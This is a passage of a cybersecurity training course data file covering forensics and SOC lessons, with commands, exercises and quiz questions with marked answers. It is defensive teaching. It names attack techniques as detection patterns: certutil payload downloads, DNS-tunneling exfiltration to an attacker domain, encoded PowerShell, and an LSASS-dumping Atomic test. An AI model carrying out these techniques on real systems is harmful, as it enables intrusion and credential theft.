        practicalExample: 'The suspect deletes `mimikatz.exe`. The forensic investigator parses `MIMIKATZ.EXE-B4A1D8F2.pf`, proving Mimikatz executed three times, ran DLLs from `C:\\Temp`, and records the exact last execution timestamp.',
        exercise: 'Explain what evidence a forensic analyst can establish using Windows Prefetch files.',
        expectedResult: 'Evidence of application execution, volume information, creation and last execution timestamps, execution counter, and list of files/DLLs loaded during the first 10 seconds.',
        knowledgeCheck: {
          question: 'What information does the Windows Amcache artifact provide that makes it uniquely valuable for malware attribution?',
          options: [
            'Network cable speed',
            'SHA-1 cryptographic hash of executed binaries, file paths, and first execution times',
            'Screen resolution',
            'Printer ink levels'
          ],
          correctAnswerIndex: 1,
          explanation: 'Amcache records cryptographic file hashes of executed programs, allowing responders to match deleted binaries against VirusTotal intelligence.'
        }
      },
      {
        id: 'dfir-106',
        title: 'Linux Artifacts, Syslog & Auditd Forensic Investigation',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['lin-103', 'dfir-101'],
        theory: 'Investigating compromised Linux systems requires analyzing text-based logs (`/var/log`), the Linux Audit daemon (`auditd`), user shell histories (`.bash_history`), authentication logs (`/var/log/auth.log`), and login accounting records (`wtmp`, `utmp`, `lastlog`). In advanced incidents, analysts inspect systemd service files, cron directories, and SSH authorized_keys for unauthorized additions.',
        steps: [
          'Inspect authentication logs for brute force and sudo usage: `/var/log/auth.log` or `/var/log/secure`.',
          'Parse auditd records using `ausearch` and `aureport`.',
          'Review login history using `last` (wtmp) and `lastb` (failed logins).',
          'Inspect user home directories for `.bash_history` manipulation and unauthorized SSH keys.'
        ],
        commands: [
          {
            command: 'grep -E "Accepted|Failed" /var/log/auth.log | tail -n 20',
            explanation: 'Inspect recent SSH authentication successes and failures.'
          },
          {
            command: 'sudo ausearch -m USER_CMD --start today',
            explanation: 'Search Linux Audit logs for privileged commands executed today.'
          },
          {
            command: 'last -F -f /var/log/wtmp',
            explanation: 'Display comprehensive history of system logins with full timestamps.'
          }
        ],
        practicalExample: 'Checking `/var/log/auth.log` shows 5,000 failed password attempts for user `root` followed immediately by `Accepted publickey for ubuntu from 203.0.113.50`, revealing a successful brute force/credential leak.',
        exercise: 'Explain why relying solely on `.bash_history` for forensic analysis is risky.',
        expectedResult: 'Attackers can disable history logging (`unset HISTFILE`), prepend spaces, or delete the file before disconnecting.',
        knowledgeCheck: {
          question: 'Which file on Linux records currently logged-in users and is read by the `who` command?',
          options: ['/var/log/utmp', '/var/log/messages', '/etc/fstab', '/etc/shadow'],
          correctAnswerIndex: 0,
          explanation: '`/var/log/utmp` maintains state for currently logged-in users; `/var/log/wtmp` records historical logins and logouts.'
        }
      },
      {
        id: 'dfir-107',
        title: 'Super Timelines & Plaso / log2timeline',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['dfir-102', 'dfir-105'],
        theory: 'A Super Timeline aggregates timestamps from every available forensic source across a compromised disk image: filesystem MACB (Modified, Accessed, Changed, Born) metadata, event logs, browser history, registry keys, prefetch, and email timestamps. Plaso (`log2timeline`) extracts millions of chronological events into a unified SQLite or Elasticsearch database, allowing investigators to reconstruct precisely what occurred before, during, and after an intrusion.',
        steps: [
          'Mount forensic disk image read-only.',
          'Run `log2timeline.py` across the mounted volume to extract artifact timestamps.',
          'Filter and format results using `psort.py` targeting specific incident time windows.',
          'Correlate initial delivery -> execution -> persistence -> lateral movement.'
        ],
        commands: [
          {
            command: 'log2timeline.py --parsers "win7,winevtx,prefetch" timeline.plaso /evidence/disk_mount',
            explanation: 'Extract targeted Windows forensic artifacts into Plaso timeline storage.'
          },
          {
            command: 'psort.py -o l2tcsv -w timeline.csv timeline.plaso "date > \'2025-10-14 00:00:00\'"',
            explanation: 'Filter Plaso events to generate CSV timeline starting from date of suspected breach.'
          }
        ],
        practicalExample: 'The timeline reveals: 09:14:02 PDF downloaded -> 09:14:15 Word spawns PowerShell -> 09:14:22 Outbound connection to C2 IP -> 09:15:01 Scheduled task created, mapping the attack progression minute by minute.',
        exercise: 'Explain what each letter in MACB timestamps represents in digital forensics.',
        expectedResult: 'M: Modified (file content altered), A: Accessed (file read), C: Changed / MFT Modified (metadata changed), B: Born / Created (file created).',
        knowledgeCheck: {
          question: 'What is the primary value of building a Super Timeline during an incident response investigation?',
          options: [
            'It defragments the storage drive',
            'It unifies disparate timestamps from filesystem, logs, registry, and browser artifacts into a single chronological narrative of adversary actions',
            'It compresses video files',
            'It deletes corrupted registry entries'
          ],
          correctAnswerIndex: 1,
          explanation: 'Super timelines correlate events across system subsystems, allowing analysts to establish cause-and-effect relationships during an attack.'
        }
      },
      {
        id: 'dfir-108',
        title: 'Malware Triage & Basic Static/Dynamic Analysis',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['dfir-101'],
        theory: 'Malware triage rapidly assesses suspicious files to determine capabilities, intent, and Indicators of Compromise (IOCs). Basic Static Analysis inspects the binary without running it: file hashing, checking strings, examining PE headers, section entropy (detecting packing/UPX), and imported API functions (e.g., `VirtualAlloc`, `WriteProcessMemory`). Basic Dynamic Analysis executes the sample in an isolated sandbox (INetSim + Wireshark + Procmon) to observe registry modifications, dropped files, and C2 beacons.',
        steps: [
          'Calculate cryptographic hashes (MD5, SHA-256) and query VirusTotal / MalwareBazaar.',
          'Extract human-readable strings using `strings -a sample.bin`.',
          'Analyze PE imports with `pefile` or PEview: identify API functions indicating injection or network access.',
          'Execute sample in an isolated sandbox running FakeNet / INetSim to record DNS and HTTP callbacks.'
        ],
        commands: [
          {
            command: 'strings -a -n 8 suspect_sample.exe | grep -iE "http|cmd|powershell|reg"',
            explanation: 'Extract strings longer than 8 characters filtering for network and execution keywords.'
          },
          {
            command: 'capa suspect_sample.exe',
            explanation: 'Identify high-level capabilities in executable (e.g. inject code, read credentials) using Capa.'
          }
        ],
        practicalExample: 'Capa analysis of a suspicious PDF wrapper flags: `creates process`, `injected code into process: explorer.exe`, and `connects to C2 over HTTP`, confirming the file is a malicious dropper without manual reverse engineering.',
        exercise: 'Explain what high entropy in a Portable Executable (.exe) binary section typically indicates.',
        expectedResult: 'High entropy ($> 7.0$) indicates the code is packed, compressed, or encrypted to evade static signature detection.',
        knowledgeCheck: {
          question: 'Which tool developed by Mandiant automatically detects executable capabilities (e.g., evasion, anti-debugging, persistence) using rule-based heuristics?',
          options: ['Capa', 'Nmap', 'Putty', 'Ping'],
          correctAnswerIndex: 0,
          explanation: 'Capa analyzes executable binaries and maps observed instruction logic to MITRE ATT&CK techniques and high-level capability summaries.'
        }
      },
      {
        id: 'dfir-109',
        title: 'Network Forensics & PCAP Extraction (Wireshark / Zeek)',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['net-103', 'dfir-101'],
        theory: 'Network forensics captures and analyzes packet traces (PCAP) to reconstruct communications between compromised hosts and command-and-control (C2) servers. Zeek (formerly Bro) transforms raw packets into structured, behavioral transaction logs (`conn.log`, `http.log`, `dns.log`, `ssl.log`). NetworkMiner extracts transferred files, certificates, and images directly from packet captures without manual stream assembly.',
        steps: [
          'Run Zeek against suspicious PCAP: `zeek -r capture.pcap`.',
          'Analyze `dns.log` for Domain Generation Algorithms (DGA) or DNS tunneling patterns.',
          'Extract transferred executables and files from HTTP sessions.',
          'Extract TLS certificate metadata from `ssl.log` to identify self-signed or anomalous C2 certificates.'
        ],
        commands: [
          {
            command: 'zeek -r malware_traffic.pcap',
            explanation: 'Process network capture file into structured Zeek security telemetry logs.'
          },
          {
            command: 'cat dns.log | zeek-cut query answers | sort | uniq -c | sort -nr | head -n 15',
            explanation: 'Triage highest frequency DNS queries to spot beaconing and abnormal domain lookups.'
          },
          {
            command: 'tshark -r capture.pcap --export-objects http,./exported_files',
            explanation: 'Extract all files transferred over unencrypted HTTP sessions into a directory.'
          }
        ],
        practicalExample: 'Reviewing `conn.log` shows an internal IP opening a 443 connection to an external VPS every 60 seconds with exactly 512 bytes transmitted each time. This regular jitter-free beacon interval confirms automated C2 heartbeats.',
        exercise: 'Explain how DNS tunneling data exfiltration is detected in Zeek DNS logs.',
        expectedResult: 'Observed as high volume of unique, high-entropy, long subdomain queries (e.g. `a9f4bc32.attacker.com`) directed to a single authoritative nameserver.',
        knowledgeCheck: {
          question: 'What command-line network analysis tool processes PCAP files into structured protocol logs like conn.log, http.log, and dns.log?',
          options: ['Zeek', 'Nmap', 'Netcat', 'Iptables'],
          correctAnswerIndex: 0,
          explanation: 'Zeek is a domain-specific network monitoring framework that interprets wire packets into structured transactional logs.'
        }
      },
      {
        id: 'dfir-110',
        title: 'Incident Containment, Eradication & Post-Mortem Protocols',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['dfir-101', 'dfir-104'],
        theory: 'The final phases of Incident Response (NIST SP 800-61 / ISO 27035) transition from identification to action. Containment limits breach impact (Network isolation, revoking compromised Kerberos krbtgt keys, disabling compromised user accounts). Eradication eliminates all artifacts, rootkits, and backdoors. Recovery restores systems to verified clean states with enhanced monitoring. The Post-Mortem (Lessons Learned) analyzes gaps to prevent recurrence.',
        steps: [
          'Execute short-term containment: isolate host at switch port / EDR level while preserving power.',
          'Perform golden ticket remediation: double reset of Active Directory `krbtgt` account password.',
          'Rebuild compromised systems from known-good golden images rather than attempting manual malware disinfection.',
          'Conduct Lessons Learned meeting and produce formal Incident Post-Mortem documentation.'
        ],
        commands: [
          {
            command: 'sudo systemctl stop suspicious_service && sudo systemctl disable suspicious_service',
            explanation: 'Immediately halt and disable persistence service during manual incident containment.'
          }
        ],
        practicalExample: 'In an Active Directory compromise, the incident commander executes a two-phase `krbtgt` password reset separated by 24 hours, invalidating all forged Kerberos Golden Tickets issued by the adversary across the entire enterprise.',
        exercise: 'Explain why Active Directory `krbtgt` password must be reset TWICE during breach recovery.',
        expectedResult: 'Active Directory maintains the current and previous password history for krbtgt; resetting twice invalidates any forged tickets generated with the historical key.',
        knowledgeCheck: {
          question: 'What is the primary objective of the "Lessons Learned" meeting following a major security incident?',
          options: [
            'To assign blame and terminate employees',
            'To objectively evaluate incident response performance, identify defensive gaps, and update playbooks to prevent recurrence',
            'To publish confidential details to the media',
            'To turn off security monitoring'
          ],
          correctAnswerIndex: 1,
          explanation: 'Lessons Learned reviews what went well, what failed, and implements strategic improvements to organizational security posture.'
        }
      }
    ]
  },
  {
    id: 11,
    title: 'SOC Analyst & Blue Team Operations',
    description: 'Master SIEM engineering, log analysis, threat hunting with Sigma and YARA, MITRE ATT&CK mapping, and automated SOAR workflows.',
    level: 'intermediate',
    badge: 'Phase 11',
    lessons: [
      {
        id: 'soc-101',
        title: 'SOC Roles, Tiers & Architecture of a Modern Cyber Defense Center',
        estimatedMinutes: 30,
        difficulty: 'beginner',
        prerequisites: ['net-101'],
        theory: 'A Security Operations Center (SOC) provides 24/7 centralized monitoring, detection, and response against cyber threats. Traditional tiered staffing includes: Tier 1 Alert Triager (validating alerts, filtering false positives), Tier 2 Incident Responder (in-depth investigation, containment), Tier 3 Threat Hunter / Specialist (advanced forensics, threat intelligence), and SOC Manager. Modern SOCs incorporate SecOps engineering and automation (SOAR) to streamline workflows.',
        steps: [
          'Map SOC organizational workflows: Alert Trigger -> Triage -> Escalation -> Response -> Lessons Learned.',
          'Understand Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) metrics.',
          'Distinguish True Positives, False Positives, True Negatives, and False Negatives.',
          'Explore SOC telemetry pipelines: Endpoints (EDR) + Network (NTA) + Cloud Logs -> SIEM.'
        ],
        commands: [
          {
            command: 'uptime',
            explanation: 'Check server availability and system load averages.'
          }
        ],
        practicalExample: 'A Tier 1 analyst receives an alert for "Suspicious PowerShell Execution". The analyst inspects command arguments, sees a legitimate IT backup script, marks it as a False Positive, and opens a tuning request to filter the backup service account.',
        exercise: 'Calculate the False Positive rate if a detection rule fires 100 alerts, and 85 are confirmed as legitimate normal business actions.',
        expectedResult: '85% False Positive rate (85 / 100), indicating the detection rule requires urgent tuning.',
        knowledgeCheck: {
          question: 'What is the primary role of a Tier 1 SOC Analyst?',
          options: [
            'Reverse engineer zero-day malware binaries in assembly',
            'Monitor SIEM alert queues, perform initial triage, filter false positives, and escalate confirmed suspicious activity to Tier 2',
            'Manage company budgets',
            'Install network cables in server racks'
          ],
          correctAnswerIndex: 1,
          explanation: 'Tier 1 analysts handle frontline monitoring and fast triage, rapidly separating false positive noise from real threats requiring escalation.'
        }
      },
      {
        id: 'soc-102',
        title: 'SIEM Fundamentals & Log Aggregation (Elasticsearch / Splunk)',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['soc-101'],
        theory: 'Security Information and Event Management (SIEM) aggregates, normalizes, indexes, and correlates event logs across thousands of disparate enterprise sources (firewalls, servers, databases, cloud, EDR). Core components: Log Shippers (Winlogbeat, Fluentd), Normalization / Schema (Elastic Common Schema - ECS, Splunk CIM), Storage / Indexing engines, and Correlation Rule engines. Queries use domain languages like Splunk SPL or Elasticsearch KQL/ES|QL.',
        steps: [
          'Understand log ingestion lifecycles and indexing tiers (hot, warm, cold, frozen).',
          'Write Splunk SPL queries filtering index, sourcetype, and event codes: `index=windows EventCode=4625 | stats count by user`.',
          'Write Elasticsearch KQL queries: `event.code: 4688 and process.name: "powershell.exe"`.',
          'Create alert threshold rules firing when failed logons exceed 10 attempts in 5 minutes.'
        ],
        commands: [
          {
            command: 'curl -s -X GET "http://localhost:9200/_cat/indices?v"',
            explanation: 'Query local Elasticsearch cluster to inspect active log indices, health, and doc counts.'
          }
        ],
        practicalExample: 'Splunk search: `index=firewall action=blocked | stats count by src_ip | sort -count | head 10`. Identifies the top 10 IP addresses generating firewall blocks across the organization today.',
        exercise: 'Write a basic KQL (Kibana Query Language) query to find all occurrences of cmd.exe spawned by Word (winword.exe).',
        expectedResult: '`process.parent.name: "winword.exe" and process.name: "cmd.exe"`',
        knowledgeCheck: {
          question: 'What is the primary purpose of a schema like Elastic Common Schema (ECS) in a SIEM?',
          options: [
            'To encrypt hard drives',
            'To standardize and normalize field names (e.g. source IP is always source.ip) across different log formats like Windows, Linux, and Cisco',
            'To delete old log records',
            'To speed up CPU clock frequency'
          ],
          correctAnswerIndex: 1,
          explanation: 'Standardization allows analysts to write a single detection rule for "source.ip" that works regardless of whether the log originated from a firewall, server, or cloud service.'
        }
      },
      {
        id: 'soc-103',
        title: 'Sigma Rules: Generic Signature Format for SIEM Detection',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['soc-102'],
        theory: 'Sigma is the open-source, vendor-agnostic signature format for writing log detection rules. Rather than writing separate rules for Splunk, Elastic, Sentinel, and QRadar, detection engineers author rules in standardized YAML using Sigma syntax. Sigma converters (e.g., `sigmac` or `pySigma`) automatically translate the generic rule into native target query syntax (Splunk SPL, KQL, Microsoft KQL).',
        steps: [
          'Analyze Sigma YAML structure: title, id, status, description, logsource, detection, condition, level, tags.',
          'Define selections and filters using wildcards, case-insensitivity, and regex.',
          'Map Sigma tags to MITRE ATT&CK techniques: `attack.execution`, `attack.t1059.001`.',
          'Convert Sigma rules to Splunk or Elastic using `sigma-cli`.'
        ],
        commands: [
          {
            command: 'sigma convert -t splunk -p sysmon rule_suspicious_powershell.yml',
            explanation: 'Convert a generic Sigma detection rule into a native Splunk SPL query.'
          },
          {
            command: 'sigma convert -t kibana rule_suspicious_powershell.yml',
            explanation: 'Convert a generic Sigma rule into a Kibana Query Language (KQL) detection string.'
          }
        ],
        practicalExample: 'A Sigma rule defines: `selection: Image|endswith: \'\\powershell.exe\' CommandLine|contains: \'-enc\'`. When compiled to Splunk, it generates `index=* (Image="*\\powershell.exe" AND CommandLine="*-enc*")`.',
        exercise: 'Identify what the `condition` field specifies in a Sigma detection rule.',
        expectedResult: 'The logical evaluation logic combining selections and filters (e.g., `selection and not filter`).',
        knowledgeCheck: {
          question: 'What is the primary advantage of writing detection rules in Sigma format?',
          options: [
            'It works on Windows only',
            'It is vendor-neutral, allowing security teams to write rules once and automatically convert them into any SIEM query format',
            'It replaces all firewalls',
            'It prevents phishing emails'
          ],
          correctAnswerIndex: 1,
          explanation: 'Sigma provides a universal signature language preventing vendor lock-in and allowing easy rule sharing across the global cyber community.'
        }
      },
      {
        id: 'soc-104',
        title: 'YARA Rules: Pattern Matching for Malware Classification',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['dfir-108'],
        theory: 'YARA is the "pattern matching Swiss army knife" used by malware analysts and SOC teams to identify and classify malware samples. A YARA rule consists of metadata, a strings definition section (plain text strings, hex byte sequences, or regular expressions), and a condition boolean logic section. YARA rules run against files, directories, running process memory, and EDR live sensors.',
        steps: [
          'Review YARA rule syntax: rule identifier, meta, strings, condition.',
          'Define text strings with modifiers: `nocase`, `wide` (UTF-16 Windows strings), `ascii`.',
          'Define hexadecimal wildcard sequences: `$hex = { E2 34 ?? ?? 89 C3 }`.',
          'Construct condition rules evaluating file size, string counts, and PE headers.'
        ],
        commands: [
          {
            command: 'yara -r /rules/malware_rules.yar /samples/suspect_directory',
            explanation: 'Scan an entire directory recursively against compiled YARA rule signatures.'
          },
          {
            command: 'yara -s rule_ransomware.yar suspicious_file.bin',
            explanation: 'Scan a file and print the exact matched string locations and offsets.'
          }
        ],
        practicalExample: 'A YARA rule looks for `$s1 = "WanaCrypt0r"` and `$s2 = "tasksche.exe"` with condition `uint16(0) == 0x5A4D and all of ($s*) and filesize < 5MB`, reliably catching WannaCry variants.',
        exercise: 'Write a YARA string definition that matches the ASCII string "cmd.exe" case-insensitively.',
        expectedResult: '`$cmd = "cmd.exe" nocase`',
        knowledgeCheck: {
          question: 'What does `uint16(0) == 0x5A4D` in a YARA rule condition verify?',
          options: [
            'That the file is a Linux ELF binary',
            'That the file begins with the "MZ" magic bytes, confirming it is a Windows Portable Executable (PE)',
            'That the file is encrypted',
            'That the file is an MP3 audio file'
          ],
          correctAnswerIndex: 1,
          explanation: '0x5A4D represents the "MZ" header signature present at offset 0 of all Windows executable binaries.'
        }
      },
      {
        id: 'soc-105',
        title: 'MITRE ATT&CK Framework Mapping & Threat Modeling',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['soc-101'],
        theory: 'The MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) framework is a globally accessible knowledge base of adversary behaviors based on real-world observations. ATT&CK organizes behaviors into 14 Tactics (the adversary\'s technical goals: Initial Access, Persistence, Privilege Escalation, Defense Evasion, Exfiltration) and hundreds of Techniques and Sub-techniques (how they achieve goals). Defenders use ATT&CK matrices to identify detection coverage gaps.',
        steps: [
          'Navigate ATT&CK Navigator to visualize enterprise defensive coverage.',
          'Differentiate Tactics (Why: Credential Access) from Techniques (How: OS Credential Dumping - T1003) and Sub-techniques (T1003.001 LSASS Memory).',
          'Map alert telemetry to specific ATT&CK IDs in SIEM triage.',
          'Use ATT&CK to assess threat actor group profiles (e.g., APT29, FIN7) and their preferred toolsets.'
        ],
        commands: [
          {
            command: 'curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json | jq \'.objects[] | select(.type=="attack-pattern" and .name=="Pass the Hash") | .external_references\'',
            explanation: 'Query MITRE CTI data to retrieve ATT&CK technique IDs and references.'
          }
        ],
        practicalExample: 'When an endpoint detects Mimikatz dumping LSASS, the SOC tags the incident with T1003.001 (OS Credential Dumping: LSASS Memory), immediately referencing MITRE recommendations for mitigation (enabling LSA Protection / RunAsPPL).',
        exercise: 'Explain the difference between a Tactic and a Technique in the MITRE ATT&CK framework.',
        expectedResult: 'A Tactic is the adversary\'s high-level objective (the "why"), while a Technique is the specific technical method used to accomplish that objective (the "how").',
        knowledgeCheck: {
          question: 'What is the purpose of the MITRE ATT&CK Navigator tool?',
          options: [
            'A GPS driving application',
            'An interactive web matrix used to visualize, color-code, and track an organization\'s detection and defensive coverage across known adversary techniques',
            'A password generator',
            'A tool to clean temporary files'
          ],
          correctAnswerIndex: 1,
          explanation: 'ATT&CK Navigator lets defense teams map out their defensive visibility, highlight coverage gaps, and compare against specific threat actor profiles.'
        }
      },
      {
        id: 'soc-106',
        title: 'Threat Intelligence & STIX/TAXII Integration (MISP / OpenCTI)',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['soc-101'],
        theory: 'Cyber Threat Intelligence (CTI) provides actionable knowledge about adversary motivations, infrastructure, and tactics. David Bianco\'s Pyramid of Pain categorizes IOCs by the difficulty their invalidation causes to attackers: Hash Values (Trivial) -> IP Addresses (Easy) -> Domain Names (Simple) -> Network/Host Artifacts (Annoying) -> Tools (Challenging) -> TTPs (Tough). Threat intelligence platforms (MISP, OpenCTI) share structured data via STIX (data format) and TAXII (transport protocol).',
        steps: [
          'Review the Pyramid of Pain levels and why hunting TTPs causes maximum pain to adversaries.',
          'Understand STIX (Structured Threat Information Expression) JSON data objects (Indicator, Malware, ThreatActor).',
          'Understand TAXII (Trusted Automated eXchange of Intelligence Information) protocol.',
          'Feed CTI indicators directly into SIEM watchlists to alert on known malicious infrastructure.'
        ],
        commands: [
          {
            command: 'curl -s https://threatfox-api.abuse.ch/api/v1/ -d \'{"query": "get_iocs", "days": 1}\' | jq \'.data[0:3]\'',
            explanation: 'Fetch fresh community Indicators of Compromise (C2 IPs, domains) via ThreatFox API.'
          }
        ],
        practicalExample: 'Blocking an attacker\'s IP address costs them $5 to spin up a new cloud server (Pyramid of Pain: Easy). Detecting their Kerberoasting technique (TTP: Tough) forces them to re-engineer their entire operational playbook.',
        exercise: 'Rank the top three most painful tiers in David Bianco\'s Pyramid of Pain.',
        expectedResult: '1. TTPs (Tough), 2. Tools (Challenging), 3. Network/Host Artifacts (Annoying).',
        knowledgeCheck: {
          question: 'What standard XML/JSON language is universally used to represent structured cyber threat intelligence data?',
          options: ['STIX', 'HTML', 'Markdown', 'LaTeX'],
          correctAnswerIndex: 0,
          explanation: 'STIX (Structured Threat Information Expression) is the international standard language for structuring threat intelligence objects and relationships.'
        }
      },
      {
        id: 'soc-107',
        title: 'Endpoint Detection & Response (EDR) & Sysmon Telemetry',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['soc-102', 'dfir-104'],
        theory: 'Endpoint Detection and Response (EDR) tools (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) provide continuous behavioral telemetry and automated containment on endpoints. Unlike traditional antivirus that relies on static file signatures, EDR inspects process trees, memory injections, network sockets, and script execution in real time. Microsoft Sysmon is a free Windows system service that delivers enterprise-grade telemetry into Windows Event Logs.',
        steps: [
          'Deploy Sysmon with the community standard SwiftOnSecurity modular configuration.',
          'Inspect Sysmon Event ID 1 (Process Creation), ID 3 (Network Connection), ID 11 (File Create), ID 13 (Registry Modification).',
          'Detect parent-child process anomalies: `winword.exe` launching `cmd.exe` or `powershell.exe`.',
          'Use EDR live response features to isolate compromised workstations from the corporate network.'
        ],
        commands: [
          {
            command: 'sysmon.exe -c sysmonconfig-export.xml',
            explanation: 'Update and apply Sysmon driver configuration with optimized filtering rules.'
          },
          {
            command: 'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-List',
            explanation: 'Read latest detailed behavioral telemetry events captured by Sysmon driver.'
          }
        ],
        practicalExample: 'An attacker uses an Office macro to spawn PowerShell with an encoded command: EDR immediately terminates the child process, isolates the workstation from the network, and notifies the SOC queue within 2 seconds.',
        exercise: 'Explain why `explorer.exe` launching `powershell.exe` is usually normal, but `spoolsv.exe` (Print Spooler) launching `cmd.exe` is highly suspicious.',
        expectedResult: 'Users legitimately launch PowerShell from desktop Explorer; Print Spooler is a background printing daemon that has no legitimate business spawning interactive command shells (indicative of PrintNightmare exploit).',
        knowledgeCheck: {
          question: 'What is the primary operational difference between traditional Antivirus (AV) and modern Endpoint Detection and Response (EDR)?',
          options: [
            'AV only runs on phones',
            'AV relies primarily on static file signatures and known hashes; EDR continuously monitors behavioral process telemetry, API calls, and provides remote containment capabilities',
            'EDR deletes all files',
            'There is no difference'
          ],
          correctAnswerIndex: 1,
          explanation: 'EDR focuses on behavior, process lineage, and active detection and response rather than relying solely on pre-computed static signatures.'
        }
      },
      {
        id: 'soc-108',
        title: 'Proactive Threat Hunting Methodologies',
        estimatedMinutes: 40,
        difficulty: 'advanced',
        prerequisites: ['soc-102', 'soc-105'],
        theory: 'Threat Hunting is the proactive, hypothesis-driven pursuit of adversaries who have evaded automated security alerts. Threat hunters assume breach. The hunt cycle: 1) Formulate Hypothesis (based on threat intelligence or new CVE), 2) Investigate via Tools & Techniques (querying SIEM/EDR datasets), 3) Uncover New Patterns / TTPs, 4) Inform & Automate (convert successful hunts into permanent SIEM correlation rules).',
        steps: [
          'Formulate a threat hypothesis: "Threat actors are using lolbins (Living Off the Land Binaries) like certutil.exe to download external payloads."',
          'Execute baseline frequency analysis (stack counting) to identify statistical outliers.',
          'Hunt for unsigned binaries executing from user-writable directories (`C:\\Users\\*\\AppData\\Local\\Temp`).',
          'Document hunt findings and codify detection logic into a new Sigma rule.'
        ],
        commands: [
          {
            command: 'cat proxy_logs.csv | awk -F, \'{print $4}\' | sort | uniq -c | sort -n | head -n 20',
            explanation: 'Stack-count destination domains in proxy logs: least frequent lookups often highlight rare C2 beacons.'
          }
        ],
        practicalExample: 'Hunting for lolbin abuse: Querying process logs for `certutil.exe -urlcache -split -f` reveals a single workstation where an attacker used the Windows certificate utility to download a remote reverse shell.',
        exercise: 'Explain what "Least Frequency of Occurrence" (stacking / long-tail analysis) means in threat hunting.',
        expectedResult: 'Sorting data by frequency so that anomalous, rare events (which occur only once or twice across thousands of hosts) stand out from common background noise.',
        knowledgeCheck: {
          question: 'What differentiates proactive Threat Hunting from traditional SOC alert monitoring?',
          options: [
            'Threat hunting is automated by robots',
            'Alert monitoring reacts to automated triggers from known signatures; Threat hunting is human-driven and hypothesis-based, actively searching for stealthy threats that triggered no alerts',
            'Threat hunting does not require computers',
            'Threat hunting is only done by law enforcement'
          ],
          correctAnswerIndex: 1,
          explanation: 'Threat hunters proactively search through environmental telemetry with the assumption that stealthy adversaries are already inside without triggering existing alerts.'
        }
      },
      {
        id: 'soc-109',
        title: 'Security Orchestration, Automation & Response (SOAR)',
        estimatedMinutes: 35,
        difficulty: 'intermediate',
        prerequisites: ['soc-101', 'soc-102'],
        theory: 'Security Orchestration, Automation, and Response (SOAR) platforms (Cortex XSOAR, Splunk SOAR, Tines, Shuffle) integrate security tools and automate repetitive analytical tasks through visual Playbooks. SOAR addresses analyst alert fatigue and reduces Mean Time to Respond (MTTR). When a phishing alert triggers, a SOAR playbook automatically extracts URLs, queries VirusTotal, checks mailbox logs, detaches malicious attachments, and quarantines emails enterprise-wide in seconds.',
        steps: [
          'Map out a Phishing Triage Playbook: Ingest Email -> Extract Artifacts -> Enrich (VirusTotal/URLScan) -> Block -> Notify.',
          'Understand Orchestration (connecting disparate APIs) vs. Automation (executing workflows without human intervention).',
          'Implement human-in-the-loop decision checkpoints for high-impact actions (e.g., blocking an executive account).',
          'Evaluate playbooks using open-source tools like Shuffle or Tines.'
        ],
        commands: [
          {
            command: 'curl -s -X POST "http://localhost:5001/api/v1/alert" -H "Content-Type: application/json" -d \'{"event": "phishing_reported", "sender": "bad@phish.com"}\'',
            explanation: 'Trigger a simulated webhook payload to initiate a SOAR automation playbook.'
          }
        ],
        practicalExample: 'A user reports a phishing email. The SOAR playbook queries the email server, discovers the exact same message was delivered to 142 other employees, purges it from all 142 inboxes simultaneously, and blocks the sender domain on the email gateway.',
        exercise: 'Identify a risk of 100% full automation in SOAR without human-in-the-loop validation.',
        expectedResult: 'A false-positive detection could trigger automated blocking of a critical corporate service or executive account, causing severe business disruption.',
        knowledgeCheck: {
          question: 'What is the primary goal of implementing a SOAR platform in a Security Operations Center?',
          options: [
            'To replace all human analysts entirely',
            'To orchestrate disparate security tools and automate repetitive triage and containment tasks, dramatically reducing response times and analyst burnout',
            'To increase the number of spam emails received',
            'To run cryptocurrency mining'
          ],
          correctAnswerIndex: 1,
          explanation: 'SOAR streamlines workflows and integrates disparate APIs, automating tedious data collection and fast containment so analysts can focus on complex investigations.'
        }
      },
      {
        id: 'soc-110',
        title: 'SOC Metrics, Continuous Improvement & Purple Teaming',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['soc-101', 'soc-105', 'pentest-101'],
        theory: 'World-class defense requires measurable performance metrics and collaborative exercises. Key Performance Indicators (KPIs) include Mean Time to Detect (MTTD), Mean Time to Acknowledge (MTTA), and Mean Time to Remediate (MTTR). Purple Teaming unites Red Teams (offensive testers) and Blue Teams (defenders) into collaborative exercises where attacks are simulated and detection logic is tuned and verified in real time using tools like Atomic Red Team.',
        steps: [
          'Calculate SOC performance metrics: MTTA, MTTD, MTTR.',
          'Execute scripted adversary simulations using Atomic Red Team (`Invoke-AtomicTest`).',
          'Conduct Purple Team workshops: Red simulates ATT&CK technique -> Blue verifies alert visibility -> Engineer tunes detection rule.',
          'Maintain a continuous detection engineering backlog and telemetry improvement roadmap.'
        ],
        commands: [
          {
            command: 'Invoke-AtomicTest T1003.001 -ShowDetails',
            explanation: 'Display test execution commands for Atomic Red Team OS Credential Dumping simulation.'
          }
        ],
        practicalExample: 'During a Purple Team exercise, Red runs an Atomic test simulating process hollowing. Blue notices Sysmon logged the event, but the SIEM correlation rule failed to alert. The detection engineer adjusts the regex on the spot, verifying the alert fires within 10 minutes.',
        exercise: 'Explain what a "Purple Team" exercise accomplishes compared to a traditional adversarial Red Team test.',
        expectedResult: 'Traditional Red Teams test defenses secretly without sharing knowledge; Purple Teaming is an open, collaborative exercise where offense and defense work together side-by-side to immediately validate and improve detections.',
        knowledgeCheck: {
